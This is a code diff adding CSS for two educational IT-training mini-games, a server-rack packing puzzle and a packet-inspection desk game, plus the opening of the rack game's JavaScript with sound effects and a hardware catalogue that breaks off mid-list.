@@ -6448,6 +6448,532 @@ body.retro #introModal h3 {
   font-size: 13.5px;
 }
 
+/* ---- rack_hero.css ---- */
+/* ==========================================================================
+   rack_hero.css - Backpack Hero / Resident Evil Inventory inspired 19-Inch Rack Tetris
+   42U Server Rack, Physics/Statics Engine, Cold/Hot Aisle Thermals & Phase Balancing
+   ========================================================================== */
+
+/* Fullscreen Overlay */
+.rhModalOverlay {
+  position: fixed;
+  inset: 0;
+  z-index: 100000;
+  background: rgba(4, 8, 16, 0.95);
+  backdrop-filter: blur(14px);
+  -webkit-backdrop-filter: blur(14px);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  padding: 16px;
+  box-sizing: border-box;
+  opacity: 0;
+  pointer-events: none;
+  transition: opacity 0.25s ease-out;
+  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+  color: #f1f5f9;
+}
+
+.rhModalOverlay.offen {
+  opacity: 1;
+  pointer-events: auto;
+}
+
+.rhModalOverlay:not(.offen) {
+  display: none !important;
+}
+
+/* Main Window */
+.rhWindow {
+  width: 1320px;
+  max-width: 98vw;
+  height: 880px;
+  max-height: 96vh;
+  background: #090d16;
+  border: 1px solid #1e293b;
+  border-radius: 14px;
+  display: flex;
+  flex-direction: column;
+  overflow: hidden;
+  box-shadow: 0 25px 60px -15px rgba(0, 0, 0, 0.8), 0 0 40px rgba(16, 185, 129, 0.12);
+  position: relative;
+}
+
+/* Top Bar */
+.rhTopBar {
+  background: #0f172a;
+  border-bottom: 2px solid #1e293b;
+  padding: 10px 18px;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  gap: 16px;
+}
+
+.rhBrand {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+}
+
+.rhBrandIcon {
+  font-size: 1.6rem;
+  filter: drop-shadow(0 0 6px #10b981);
+}
+
+.rhBrandTitle h2 {
+  margin: 0;
+  font-size: 1.15rem;
+  font-weight: 800;
+  color: #34d399;
+  letter-spacing: 0.04em;
+  text-transform: uppercase;
+}
+
+.rhBrandTitle .rhSub {
+  font-size: 0.72rem;
+  color: #94a3b8;
+  font-weight: 600;
+}
+
+/* Mission Selector */
+.rhMissionTabs {
+  display: flex;
+  background: rgba(15, 23, 42, 0.8);
+  border: 1px solid #334155;
+  border-radius: 8px;
+  padding: 3px;
+  gap: 4px;
+}
+
+.rhMissionBtn {
+  background: transparent;
+  border: none;
+  border-radius: 6px;
+  color: #94a3b8;
+  font-size: 0.76rem;
+  font-weight: 700;
+  padding: 6px 12px;
+  cursor: pointer;
+  transition: all 0.15s;
+}
+
+.rhMissionBtn:hover {
+  color: #f1f5f9;
+}
+
+.rhMissionBtn.akt {
+  background: #1e293b;
+  color: #38bdf8;
+  box-shadow: 0 0 10px rgba(56, 189, 248, 0.2);
+}
+
+/* 3-Column Workspace */
+.rhWorkspace {
+  flex: 1;
+  display: grid;
+  grid-template-columns: 320px 1fr 340px;
+  gap: 16px;
+  padding: 16px;
+  background: radial-gradient(circle at 50% 30%, #111827 0%, #060911 100%);
+  overflow: hidden;
+}
+
+/* Left Column: Inventory / Palette */
+.rhInventoryCol {
+  background: #0f172a;
+  border: 1px solid #1e293b;
+  border-radius: 12px;
+  padding: 14px;
+  display: flex;
+  flex-direction: column;
+  overflow: hidden;
+  box-shadow: 0 10px 25px rgba(0, 0, 0, 0.4);
+}
+
+.rhInvHeader {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  border-bottom: 2px solid #334155;
+  padding-bottom: 8px;
+  margin-bottom: 12px;
+}
+
+.rhInvHeader h3 {
+  margin: 0;
+  font-size: 0.95rem;
+  color: #f1f5f9;
+  text-transform: uppercase;
+}
+
+.rhInvList {
+  flex: 1;
+  overflow-y: auto;
+  display: flex;
+  flex-direction: column;
+  gap: 10px;
+  padding-right: 4px;
+}
+
+/* Hardware Item Cards */
+.rhItemCard {
+  background: #1e293b;
+  border: 2px solid #334155;
+  border-radius: 8px;
+  padding: 10px;
+  cursor: pointer;
+  transition: all 0.15s ease;
+  position: relative;
+  user-select: none;
+}
+
+.rhItemCard:hover {
+  border-color: #38bdf8;
+  transform: translateX(4px);
+  background: #243248;
+}
+
+.rhItemCard.selected {
+  border-color: #10b981;
+  background: rgba(16, 185, 129, 0.15);
+  box-shadow: 0 0 15px rgba(16, 185, 129, 0.3);
+}
+
+.rhItemCard.placed {
+  opacity: 0.45;
+  border-style: dashed;
+}
+
+.rhItemTop {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  margin-bottom: 4px;
+}
+
+.rhItemName {
+  font-weight: 800;
+  font-size: 0.85rem;
+  color: #f8fafc;
+}
+
+.rhItemHeight {
+  background: rgba(56, 189, 248, 0.2);
+  color: #38bdf8;
+  border: 1px solid rgba(56, 189, 248, 0.4);
+  font-size: 0.72rem;
+  font-weight: 800;
+  padding: 2px 6px;
+  border-radius: 4px;
+}
+
+.rhItemMeta {
+  display: flex;
+  gap: 10px;
+  font-size: 0.72rem;
+  color: #94a3b8;
+}
+
+.rhItemMeta span b {
+  color: #cbd5e1;
+}
+
+/* Center Column: The 42U Server Rack */
+.rhRackCol {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  position: relative;
+  overflow: hidden;
+}
+
+.rhRackControls {
+  display: flex;
+  gap: 12px;
+  margin-bottom: 10px;
+  width: 100%;
+  justify-content: space-between;
+  align-items: center;
+}
+
+.rhRackModeToggle {
+  display: flex;
+  background: #0f172a;
+  border: 1px solid #334155;
+  border-radius: 6px;
+  padding: 2px;
+}
+
+.rhModeBtn {
+  background: transparent;
+  border: none;
+  border-radius: 4px;
+  color: #94a3b8;
+  font-size: 0.75rem;
+  font-weight: 700;
+  padding: 5px 12px;
+  cursor: pointer;
+}
+
+.rhModeBtn.akt {
+  background: #38bdf8;
+  color: #0f172a;
+}
+
+/* 42U Rack Cabinet Frame */
+.rhCabinet {
+  width: 360px;
+  height: 680px;
+  background: #0c1220;
+  border: 4px solid #334155;
+  border-radius: 8px;
+  box-shadow: 0 15px 40px rgba(0, 0, 0, 0.8), inset 0 0 20px rgba(0, 0, 0, 0.7);
+  display: flex;
+  position: relative;
+  overflow: hidden;
+}
+
+/* Rails & Numbers */
+.rhRail {
+  width: 32px;
+  background: #0f172a;
+  border-right: 1px solid #1e293b;
+  display: flex;
+  flex-direction: column-reverse;
+  font-size: 0.58rem;
+  color: #64748b;
+  font-variant-numeric: tabular-nums;
+  font-weight: 700;
+  user-select: none;
+}
+
+.rhRail.right {
+  border-right: none;
+  border-left: 1px solid #1e293b;
+}
+
+.rhRailSlot {
+  flex: 1;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  border-bottom: 1px solid rgba(51, 65, 85, 0.4);
+}
+
+/* Rack Slots Grid (U1 at bottom, U42 at top) */
+.rhSlotsGrid {
+  flex: 1;
+  display: flex;
+  flex-direction: column-reverse;
+  background: #080c16;
+  position: relative;
+}
+
+.rhSlotRow {
+  flex: 1;
+  border-bottom: 1px dashed rgba(51, 65, 85, 0.4);
+  position: relative;
+  cursor: pointer;
+  transition: background 0.1s;
+}
+
+.rhSlotRow:hover {
+  background: rgba(56, 189, 248, 0.15);
+}
+
+.rhSlotRow.occupied {
+  cursor: default;
+}
+
+/* Mounted Hardware in Rack */
+.rhMountedItem {
+  position: absolute;
+  left: 2px;
+  right: 2px;
+  background: linear-gradient(180deg, #1e293b 0%, #0f172a 100%);
+  border: 2px solid #38bdf8;
+  border-radius: 4px;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 0 8px;
+  z-index: 10;
+  box-shadow: 0 4px 10px rgba(0, 0, 0, 0.6);
+  font-size: 0.72rem;
+  color: #f8fafc;
+  font-weight: 700;
+  user-select: none;
+}
+
+.rhMountedItem.usv {
+  border-color: #f59e0b;
+  background: linear-gradient(180deg, #2b1f0d 0%, #150f05 100%);
+}
+
+.rhMountedItem.storage {
+  border-color: #a855f7;
+  background: linear-gradient(180deg, #251238 0%, #10061c 100%);
+}
+
+.rhMountedItem.server {
+  border-color: #38bdf8;
+}
+
+.rhMountedItem.switch {
+  border-color: #10b981;
+  background: linear-gradient(180deg, #093322 0%, #041710 100%);
+}
+
+.rhMountedItem.panel {
+  border-color: #64748b;
+  background: #1e293b;
+}
+
+.rhRemoveBtn {
+  background: rgba(239, 68, 68, 0.2);
+  border: 1px solid #ef4444;
+  color: #f87171;
+  border-radius: 3px;
+  width: 18px;
+  height: 18px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  cursor: pointer;
+  font-size: 0.65rem;
+}
+
+.rhRemoveBtn:hover {
+  background: #dc2626;
+  color: white;
+}
+
+/* Right Column: Telemetry & Simulation Meters */
+.rhTelemetryCol {
+  background: #0f172a;
+  border: 1px solid #1e293b;
+  border-radius: 12px;
+  padding: 14px;
+  display: flex;
+  flex-direction: column;
+  gap: 14px;
+  overflow-y: auto;
+  box-shadow: 0 10px 25px rgba(0, 0, 0, 0.4);
+}
+
+.rhTelemCard {
+  background: #1e293b;
+  border: 1px solid #334155;
+  border-radius: 8px;
+  padding: 10px;
+}
+
+.rhTelemCard h4 {
+  margin: 0 0 6px;
+  font-size: 0.78rem;
+  color: #94a3b8;
+  text-transform: uppercase;
+  display: flex;
+  justify-content: space-between;
+}
+
+/* Stability / Center of Gravity Gauge */
+.rhCgGauge {
+  height: 8px;
+  background: #0f172a;
+  border-radius: 4px;
+  overflow: hidden;
+  position: relative;
+  margin: 8px 0;
+}
+
+.rhCgFill {
+  height: 100%;
+  width: 40%;
+  background: #10b981;
+  transition: all 0.3s ease;
+}
+
+.rhCgFill.warn { background: #f59e0b; }
+.rhCgFill.danger { background: #ef4444; box-shadow: 0 0 10px #ef4444; }
+
+/* Thermal Heatmap Gauge */
+.rhThermalBox {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  background: rgba(15, 23, 42, 0.6);
+  padding: 6px 10px;
+  border-radius: 6px;
+  margin-top: 6px;
+}
+
+.rhTempBadge {
+  font-size: 0.88rem;
+  font-weight: 800;
+  font-variant-numeric: tabular-nums;
+  padding: 2px 8px;
+  border-radius: 4px;
+}
+
+.rhTempBadge.cool { background: rgba(16, 185, 129, 0.2); color: #34d399; }
+.rhTempBadge.warm { background: rgba(245, 158, 11, 0.2); color: #fbbf24; }
+.rhTempBadge.hot { background: rgba(239, 68, 68, 0.2); color: #f87171; box-shadow: 0 0 8px rgba(239, 68, 68, 0.4); }
+
+/* PDU Phase Bars */
+.rhPhaseRow {
+  display: flex;
+  flex-direction: column;
+  gap: 4px;
+  margin-top: 6px;
+}
+
+.rhPhaseBar {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  font-size: 0.72rem;
+  color: #cbd5e1;
+}
+
+.rhPhaseTrack {
+  flex: 1;
+  height: 6px;
+  background: #0f172a;
+  border-radius: 3px;
+  overflow: hidden;
+}
+
+.rhPhaseFill {
+  height: 100%;
+  background: #38bdf8;
+  width: 0%;
+  transition: width 0.3s ease;
+}
+
+/* Action Button: Verify Mission */
+.rhVerifyBtn {
+  background: linear-gradient(135deg, #0284c7, #38bdf8);
+  border: none;
+  border-radius: 8px;
+  color: #0f172a;
+  font-weight: 800;
+  padding: 12px;
+  font-size: 0.95rem;
+  text-transform: uppercase;
+  letter-spacing: 0.04em;
+  cursor: pointer;
+  transition: all 0.15s ease;
+  box-shadow: 0 4px 15px rgba(56, 189, 248, 0.4);
+  margin-top: auto;
+}
+
+.rhVerifyBtn:hover {
+  transform: translateY(-2px);
+  box-shadow: 0 6px 20px rgba(56, 189, 248, 0.6);
+}
+
 /* ---- rechenlabor.css ---- */
 /* ==========================================================================
    rechenlabor.css — IHK-Rechenlabor mit Distraktoren & didaktischem Lösungsweg
@@ -8310,6 +8836,627 @@ body.retro .synCode { border: 3px solid var(--pix); border-radius: 0; font-famil
 body.retro .synZeile input { border-radius: 0; border: 3px solid var(--pix); font-family: system-ui, -apple-system, "Segoe UI", Roboto, Arial, sans-serif; }
 body.retro #synQr svg { border-radius: 0; border: 3px solid var(--pix); }
 body.retro .synWahlBox { border-radius: 0; border: 3px solid var(--pix); }
+
+/* ---- sysadmin_please.css ---- */
+/* ==========================================================================
+   sysadmin_please.css - Papers, Please inspired Gateway Packet Inspector
+   Retro CRT, tactile desk, wooden stamps, DPI magnifying glass & citation printer
+   ========================================================================== */
+
+/* Fullscreen Overlay */
+.spModalOverlay {
+  position: fixed;
+  inset: 0;
+  z-index: 100000;
+  background: rgba(5, 10, 20, 0.94);
+  backdrop-filter: blur(14px);
+  -webkit-backdrop-filter: blur(14px);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  padding: 16px;
+  box-sizing: border-box;
+  opacity: 0;
+  pointer-events: none;
+  transition: opacity 0.25s ease-out;
+  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+  color: #f1f5f9;
+}
+
+.spModalOverlay.offen {
+  opacity: 1;
+  pointer-events: auto;
+}
+
+.spModalOverlay:not(.offen) {
+  display: none !important;
+}
+
+/* Main Terminal Window */
+.spWindow {
+  width: 1240px;
+  max-width: 98vw;
+  height: 860px;
+  max-height: 96vh;
+  background: #090d16;
+  border: 1px solid #1e293b;
+  border-radius: 14px;
+  display: flex;
+  flex-direction: column;
+  overflow: hidden;
+  box-shadow: 0 25px 60px -15px rgba(0, 0, 0, 0.8), 0 0 40px rgba(56, 189, 248, 0.12);
+  position: relative;
+}
+
+/* CRT Scanline & Grain Overlay */
+.spCrtOverlay {
+  position: absolute;
+  inset: 0;
+  pointer-events: none;
+  background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.22) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.03), rgba(0, 255, 0, 0.01), rgba(0, 0, 255, 0.03));
+  background-size: 100% 3px, 4px 100%;
+  z-index: 50;
+  opacity: 0.7;
+}
+
+/* Top Bar: Monitor HUD */
+.spTopBar {
+  background: #0f172a;
+  border-bottom: 2px solid #1e293b;
+  padding: 10px 18px;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  gap: 16px;
+  position: relative;
+  z-index: 20;
+}
+
+.spBrand {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+}
+
+.spBrandIcon {
+  font-size: 1.6rem;
+  filter: drop-shadow(0 0 6px #38bdf8);
+}
+
+.spBrandTitle h2 {
+  margin: 0;
+  font-size: 1.15rem;
+  font-weight: 800;
+  color: #38bdf8;
+  letter-spacing: 0.04em;
+  text-transform: uppercase;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+}
+
+.spBrandTitle .spSub {
+  font-size: 0.72rem;
+  color: #94a3b8;
+  font-weight: 600;
+}
+
+/* HUD Gauges */
+.spHudStats {
+  display: flex;
+  align-items: center;
+  gap: 14px;
+}
+
+.spStatBox {
+  background: rgba(15, 23, 42, 0.85);
+  border: 1px solid #334155;
+  border-radius: 8px;
+  padding: 4px 12px;
+  display: flex;
+  flex-direction: column;
+  min-width: 85px;
+}
+
+.spStatBox .lbl {
+  font-size: 0.65rem;
+  text-transform: uppercase;
+  color: #64748b;
+  font-weight: 700;
+  letter-spacing: 0.05em;
+}
+
+.spStatBox .val {
+  font-size: 0.95rem;
+  font-weight: 800;
+  font-variant-numeric: tabular-nums;
+  color: #f8fafc;
+}
+
+.spStatBox.sla .val { color: #34d399; }
+.spStatBox.budget .val { color: #fbbf24; }
+.spStatBox.warnings .val { color: #f87171; }
+
+.spCloseBtn {
+  background: transparent;
+  border: 1px solid #334155;
+  color: #94a3b8;
+  font-size: 1.1rem;
+  width: 34px;
+  height: 34px;
+  border-radius: 8px;
+  cursor: pointer;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  transition: all 0.15s ease;
+}
+
+.spCloseBtn:hover {
+  background: rgba(239, 68, 68, 0.2);
+  border-color: #ef4444;
+  color: #f87171;
+}
+
+/* Desk Area: 3 Columns */
+.spDesk {
+  flex: 1;
+  display: grid;
+  grid-template-columns: 280px 1fr 340px;
+  gap: 16px;
+  padding: 16px;
+  background: radial-gradient(circle at 50% 30%, #111827 0%, #070a12 100%);
+  overflow: hidden;
+  position: relative;
+  z-index: 10;
+}
+
+/* Left Column: Printer & Tools */
+.spLeftCol {
+  display: flex;
+  flex-direction: column;
+  gap: 14px;
+}
+
+/* Dot-Matrix Printer */
+.spPrinterBox {
+  background: #0f172a;
+  border: 2px solid #1e293b;
+  border-radius: 10px;
+  padding: 12px;
+  display: flex;
+  flex-direction: column;
+  height: 320px;
+  position: relative;
+  box-shadow: inset 0 2px 10px rgba(0, 0, 0, 0.6);
+}
+
+.spPrinterHeader {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  border-bottom: 1px dashed #334155;
+  padding-bottom: 6px;
+  margin-bottom: 8px;
+}
+
+.spPrinterHeader span {
+  font-size: 0.72rem;
+  font-weight: 700;
+  text-transform: uppercase;
+  color: #94a3b8;
+}
+
+.spPrinterSlot {
+  flex: 1;
+  overflow-y: auto;
+  position: relative;
+  display: flex;
+  flex-direction: column;
+  gap: 8px;
+}
+
+.spCitationPaper {
+  background: #fef08a;
+  color: #713f12;
+  padding: 10px;
+  border-radius: 4px;
+  border-left: 5px solid #dc2626;
+  font-family: "Courier New", Courier, monospace;
+  font-size: 0.76rem;
+  line-height: 1.35;
+  box-shadow: 0 4px 10px rgba(0, 0, 0, 0.35);
+  animation: spPaperSlideOut 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+}
+
+@keyframes spPaperSlideOut {
+  from { transform: translateY(-30px); opacity: 0; }
+  to { transform: translateY(0); opacity: 1; }
+}
+
+.spCitationPaper .tit {
+  font-weight: 900;
+  color: #b91c1c;
+  display: block;
+  margin-bottom: 4px;
+  text-transform: uppercase;
+}
+
+.spCitationEmpty {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  height: 100%;
+  color: #475569;
+  font-size: 0.76rem;
+  text-align: center;
+}
+
+/* Desk Tools (Lupe / Whois) */
+.spToolsCard {
+  background: rgba(15, 23, 42, 0.7);
+  border: 1px solid #1e293b;
+  border-radius: 10px;
+  padding: 12px;
+  display: flex;
+  flex-direction: column;
+  gap: 10px;
+}
+
+.spToolBtn {
+  background: #1e293b;
+  border: 1px solid #334155;
+  color: #cbd5e1;
+  padding: 9px 12px;
+  border-radius: 8px;
+  font-size: 0.82rem;
+  font-weight: 700;
+  cursor: pointer;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  transition: all 0.15s ease;
+}
+
+.spToolBtn:hover {
+  background: #334155;
+  color: #38bdf8;
+  border-color: #38bdf8;
+}
+
+.spToolBtn.akt {
+  background: rgba(56, 189, 248, 0.2);
+  border-color: #38bdf8;
+  color: #38bdf8;
+  box-shadow: 0 0 12px rgba(56, 189, 248, 0.3);
+}
+
+/* Center Column: The Dossier & Stamps */
+.spCenterCol {
+  display: flex;
+  flex-direction: column;
+  gap: 14px;
+  overflow: hidden;
+}
+
+/* Dossier Folder */
+.spDossierFolder {
+  flex: 1;
+  background: #1e293b;
+  border: 2px solid #334155;
+  border-radius: 12px;
+  display: flex;
+  flex-direction: column;
+  box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+  position: relative;
+  overflow: hidden;
+}
+
+.spDossierTabs {
+  display: flex;
+  background: #0f172a;
+  border-bottom: 2px solid #334155;
+  padding: 4px 8px 0;
+  gap: 4px;
+}
+
+.spDossierTab {
+  background: transparent;
+  border: 1px solid transparent;
+  border-bottom: none;
+  border-top-left-radius: 6px;
+  border-top-right-radius: 6px;
+  color: #94a3b8;
+  font-size: 0.78rem;
+  font-weight: 700;
+  padding: 7px 14px;
+  cursor: pointer;
+  transition: all 0.15s;
+}
+
+.spDossierTab:hover {
+  color: #f1f5f9;
+}
+
+.spDossierTab.akt {
+  background: #1e293b;
+  border-color: #334155;
+  color: #38bdf8;
+}
+
+.spDossierContent {
+  flex: 1;
+  padding: 16px;
+  overflow-y: auto;
+  font-family: "Courier New", Courier, monospace;
+}
+
+/* Stamp Mark Overlay */
+.spStampWatermark {
+  position: absolute;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%) rotate(-18deg) scale(0);
+  font-size: 3.5rem;
+  font-weight: 900;
+  text-transform: uppercase;
+  padding: 12px 30px;
+  border-radius: 12px;
+  pointer-events: none;
+  opacity: 0;
+  z-index: 60;
+  transition: all 0.25s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+}
+
+.spStampWatermark.permit {
+  border: 8px solid #10b981;
+  color: #10b981;
+  background: rgba(16, 185, 129, 0.2);
+  text-shadow: 0 0 20px #10b981;
+  box-shadow: 0 0 30px rgba(16, 185, 129, 0.5);
+  transform: translate(-50%, -50%) rotate(-15deg) scale(1);
+  opacity: 1;
+}
+
+.spStampWatermark.deny {
+  border: 8px solid #ef4444;
+  color: #ef4444;
+  background: rgba(239, 68, 68, 0.2);
+  text-shadow: 0 0 20px #ef4444;
+  box-shadow: 0 0 30px rgba(239, 68, 68, 0.5);
+  transform: translate(-50%, -50%) rotate(12deg) scale(1);
+  opacity: 1;
+}
+
+/* Header Table Styles */
+.spHeaderTable {
+  width: 100%;
+  border-collapse: collapse;
+  font-size: 0.82rem;
+  margin-bottom: 12px;
+}
+
+.spHeaderTable th {
+  text-align: left;
+  color: #38bdf8;
+  padding: 6px 10px;
+  border-bottom: 1px solid #334155;
+  width: 160px;
+}
+
+.spHeaderTable td {
+  padding: 6px 10px;
+  border-bottom: 1px solid #334155;
+  color: #e2e8f0;
+}
+
+.spHeaderTable tr:hover td {
+  background: rgba(56, 189, 248, 0.05);
+}
+
+.spAlertHighlight {
+  background: rgba(239, 68, 68, 0.2) !important;
+  color: #f87171 !important;
+  font-weight: 700;
+  padding: 2px 6px;
+  border-radius: 4px;
+}
+
+.spNoticeHighlight {
+  background: rgba(245, 158, 11, 0.2) !important;
+  color: #fbbf24 !important;
+  font-weight: 700;
+  padding: 2px 6px;
+  border-radius: 4px;
+}
+
+/* DPI Hex View */
+.spHexDump {
+  font-size: 0.75rem;
+  line-height: 1.5;
+  background: #090d16;
+  padding: 10px;
+  border-radius: 6px;
+  border: 1px solid #334155;
+  max-height: 280px;
+  overflow-y: auto;
+  white-space: pre-wrap;
+  word-break: break-all;
+}
+
+.spHexDump span.vuln {
+  background: #ef4444;
+  color: #fff;
+  font-weight: 800;
+  padding: 0 3px;
+  border-radius: 2px;
+  box-shadow: 0 0 6px #ef4444;
+}
+
+/* Stamp Controls Panel */
+.spStampsPanel {
+  display: flex;
+  gap: 16px;
+  justify-content: center;
+  padding: 10px;
+  background: rgba(15, 23, 42, 0.8);
+  border: 1px solid #1e293b;
+  border-radius: 12px;
+}
+
+.spStampBtn {
+  flex: 1;
+  max-width: 240px;
+  height: 60px;
+  border-radius: 10px;
+  font-size: 1.1rem;
+  font-weight: 900;
+  text-transform: uppercase;
+  letter-spacing: 0.06em;
+  cursor: pointer;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 10px;
+  transition: all 0.12s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+  box-shadow: 0 6px 0 #0f172a, 0 10px 20px rgba(0, 0, 0, 0.4);
+}
+
+.spStampBtn:active {
+  transform: translateY(4px);
+  box-shadow: 0 2px 0 #0f172a, 0 4px 10px rgba(0, 0, 0, 0.4);
+}
+
+.spStampBtn.permit {
+  background: linear-gradient(135deg, #059669, #10b981);
+  border: 2px solid #34d399;
+  color: #ffffff;
+}
+
+.spStampBtn.permit:hover {
+  box-shadow: 0 6px 0 #064e3b, 0 0 25px rgba(16, 185, 129, 0.6);
+}
+
+.spStampBtn.deny {
+  background: linear-gradient(135deg, #dc2626, #ef4444);
+  border: 2px solid #f87171;
+  color: #ffffff;
+}
+
+.spStampBtn.deny:hover {
+  box-shadow: 0 6px 0 #7f1d1d, 0 0 25px rgba(239, 68, 68, 0.6);
+}
+
+/* Right Column: Rulebook / Bulletin Board */
+.spRightCol {
+  display: flex;
+  flex-direction: column;
+  gap: 14px;
+}
+
+.spRulebook {
+  flex: 1;
+  background: #1e293b;
+  border: 2px solid #334155;
+  border-radius: 12px;
+  display: flex;
+  flex-direction: column;
+  padding: 14px;
+  box-shadow: 0 10px 25px rgba(0, 0, 0, 0.4);
+  overflow-y: auto;
+}
+
+.spRuleHeader {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  border-bottom: 2px solid #38bdf8;
+  padding-bottom: 8px;
+  margin-bottom: 12px;
+}
+
+.spRuleHeader h3 {
+  margin: 0;
+  font-size: 0.95rem;
+  font-weight: 800;
+  color: #38bdf8;
+  text-transform: uppercase;
+}
+
+.spRuleList {
+  display: flex;
+  flex-direction: column;
+  gap: 10px;
+}
+
+.spRuleItem {
+  background: rgba(15, 23, 42, 0.7);
+  border-left: 4px solid #38bdf8;
+  padding: 8px 12px;
+  border-radius: 0 6px 6px 0;
+  font-size: 0.8rem;
+  line-height: 1.45;
+  color: #cbd5e1;
+}
+
+.spRuleItem b {
+  color: #f8fafc;
+}
+
+.spRuleItem.crit {
+  border-left-color: #ef4444;
+  background: rgba(239, 68, 68, 0.1);
+}
+
+.spRuleItem.warn {
+  border-left-color: #f59e0b;
+  background: rgba(245, 158, 11, 0.1);
+}
+
+/* Day Progress / Next Day Modal */
+.spDayEndCard {
+  background: #0f172a;
+  border: 2px solid #38bdf8;
+  border-radius: 12px;
+  padding: 24px;
+  text-align: center;
+  max-width: 480px;
+  margin: auto;
+  box-shadow: 0 0 40px rgba(56, 189, 248, 0.3);
+}
+
+.spDayEndCard h2 {
+  color: #38bdf8;
+  margin-top: 0;
+}
+
+.spNextBtn {
+  background: #0284c7;
+  color: white;
+  border: none;
+  border-radius: 8px;
+  font-weight: 700;
+  padding: 10px 24px;
+  font-size: 0.95rem;
+  cursor: pointer;
+  margin-top: 14px;
+}
+
+.spNextBtn:hover {
+  background: #0369a1;
+}
+
+/* Responsive adjustments */
+@media (max-width: 1000px) {
+  .spDesk {
+    grid-template-columns: 1fr;
+    overflow-y: auto;
+  }
+  .spWindow {
+    height: 98vh;
+  }
+}
 
 /* ---- vorlesung.css ---- */
 /* vorlesung.css - Interaktive-KI-Vorlesung im Kurzgesagt-Stil (Explorable Explanations) */
@@ -56919,6 +58066,659 @@ Ablaufverfolgung beendet.`, "success");
   };
 })();
 
+/* ---- f_rack_hero.js ---- */
+// f_rack_hero.js - "Rack Hero: 19-Zoll Tetris" (Backpack Hero Vibe für Fachinformatiker)
+// 42U Server-Rack Tetris mit Schwerpunkt-Statik, Kaltgang/Warmgang DIN EN 50600 & Phasen-Balancing.
+(function () {
+  "use strict";
+
+  const RACK_HERO = {
+    modalId: "rackHeroModal",
+    aktMissionIdx: 0,
+    maxU: 42,
+    rackGrid: {}, // uSlot -> itemId
+    ausgewaehltesItem: null,
+    ansichtModus: "front", // "front" | "thermik" | "cables"
+
+    // Sound-Synthesizer via Web Audio API
+    audioCtx: null,
+    initAudio: function () {
+      if (!this.audioCtx) {
+        const AudioClass = window.AudioContext || window.webkitAudioContext;
+        if (AudioClass) this.audioCtx = new AudioClass();
+      }
+      if (this.audioCtx && this.audioCtx.state === "suspended") {
+        this.audioCtx.resume();
+      }
+    },
+
+    beep: function (freq, type, duration, vol = 0.15) {
+      this.initAudio();
+      if (!this.audioCtx) return;
+      try {
+        const osc = this.audioCtx.createOscillator();
+        const gain = this.audioCtx.createGain();
+        osc.type = type;
+        osc.frequency.setValueAtTime(freq, this.audioCtx.currentTime);
+        gain.gain.setValueAtTime(vol, this.audioCtx.currentTime);
+        gain.gain.exponentialRampToValueAtTime(0.001, this.audioCtx.currentTime + duration);
+        osc.connect(gain);
+        gain.connect(this.audioCtx.destination);
+        osc.start();
+        osc.stop(this.audioCtx.currentTime + duration);
+      } catch (e) {}
+    },
+
+    soundSnap: function () {
+      this.beep(520, "sine", 0.05, 0.2);
+      setTimeout(() => this.beep(380, "triangle", 0.08, 0.25), 40);
+    },
+
+    soundRemove: function () {
+      this.beep(280, "triangle", 0.06, 0.2);
+    },
+
+    soundAlarm: function () {
+      for (let i = 0; i < 3; i++) {
+        setTimeout(() => this.beep(750, "sawtooth", 0.1, 0.3), i * 150);
+      }
+    },
+
+    soundSuccess: function () {
+      [440, 554, 659, 880].forEach((f, i) => {
+        setTimeout(() => this.beep(f, "sine", 0.15, 0.2), i * 100);
+      });
+    },
+
+    // Hardware-Katalog mit realen IHK-Prüfungswerten
+    HARDWARE: {
+      "usv-3u": { id: "usv-3u", name: "Online-USV VFI (3HE)", u: 3, gewicht: 42, watt: 2700, typ: "usv", desc: "Blei-Akkus. Muss zwingend nach unten (Statik/Schwerpunkt!)." },
+      "usv-2u": { id: "usv-2u", name: "Line-Interactive USV (2HE)", u: 2, gewicht: 22, watt: 1200, typ: "usv", desc: "USV für kleinere Racks. Unten platzieren." },
+      "san-4u": { id: "san-4u", name: "SAS SAN Storage (4HE)", u: 4, gewicht: 35, watt: 750, typ: "storage", desc: "24x Enterprise SAS HDDs im RAID 6. Schweres Gerät." },
+      "srv-2u": { id: "srv-2u", name: "Virtualisierungs-Host (2HE)", u: 2, gewicht: 18, watt: 450, typ: "server", desc: "Dual Xeon, redundante PSUs (A/B-Feed), Kaltluft-Front." },
+      "sw-48p": { id: "sw-48p", name: "Managed 48-Port Switch (1HE)", u: 1, gewicht: 4.5, watt: 120, typ: "switch", desc: "PoE+ Core-Switch mit 10GbE SFP+ Uplinks." },
+      "sw-24p": { id: "sw-24p", name: "24-Port Gigabit Switch (1HE)", u: 1, gewicht: 3.2, watt: 60, typ: "switch", desc: "Etagen-Verteiler Switch." },
